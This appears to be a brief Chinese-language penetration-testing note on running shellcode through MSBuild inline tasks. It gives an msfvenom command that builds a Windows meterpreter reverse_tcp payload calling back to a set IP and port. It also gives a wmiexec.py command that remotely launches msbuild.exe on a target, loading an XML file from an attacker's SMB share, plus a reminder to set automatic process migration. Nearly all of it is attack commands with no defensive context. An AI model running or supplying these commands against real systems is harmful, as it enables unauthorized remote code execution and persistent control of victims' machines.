	链接
	https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml
	>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.108 lport=12138 -f csharp
	远程执行
	>wmiexec.py <USER>:'<PASS>'@<RHOST> cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attackerip>\<share>\msbuild_nps.xml
	要设置自动迁移进程
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/74.png)